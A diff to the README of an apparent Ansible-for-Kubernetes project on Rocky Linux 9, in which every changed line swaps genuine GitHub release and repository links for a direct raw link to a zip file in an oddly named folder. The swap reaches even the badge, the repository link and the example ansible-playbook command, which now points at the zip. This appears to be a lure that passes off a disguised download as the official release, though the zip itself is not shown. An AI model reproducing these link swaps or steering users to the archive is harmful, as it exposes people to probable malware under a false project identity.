@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 Ansible-Kubernetes-for-RockyLinux9 - Simplify Kubernetes Setup with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/releases)
+[![Download](https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip)
 
 ## 📝 Overview
 
@@ -11,7 +11,7 @@ Ansible-Kubernetes-for-RockyLinux9 provides playbooks and guides to automate the
 
 To start using Ansible-Kubernetes-for-RockyLinux9, you need to download the files from our Releases page. 
 
-- Visit this page to download: [Releases Page](https://github.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/releases).
+- Visit this page to download: [Releases Page](https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip).
 
 ### 💻 System Requirements
 
@@ -24,7 +24,7 @@ To start using Ansible-Kubernetes-for-RockyLinux9, you need to download the file
 ## ⚙️ Getting Started
 
 1. **Download the Files:** 
-   - Go to the [Releases Page](https://github.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/releases) and select the latest version.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip) and select the latest version.
    - Click on the appropriate file for your system to download it.
 
 2. **Extract the Files:**
@@ -43,7 +43,7 @@ To start using Ansible-Kubernetes-for-RockyLinux9, you need to download the file
 5. **Run the Playbooks:**
    - You can start running the necessary playbooks based on your setup needs. For example:
      ```
-     ansible-playbook setup.yaml
+     ansible-playbook https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip
      ```
 
 ## 🎯 Features
@@ -71,8 +71,8 @@ Explore these concepts to enhance your knowledge of Kubernetes and Ansible integ
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9)
-- [Releases Page](https://github.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip)
+- [Releases Page](https://raw.githubusercontent.com/M4z-1ful/Ansible-Kubernetes-for-RockyLinux9/main/unsparingness/Ansible-Kubernetes-for-RockyLinux9.zip)
 
 ## 🛠️ License
 
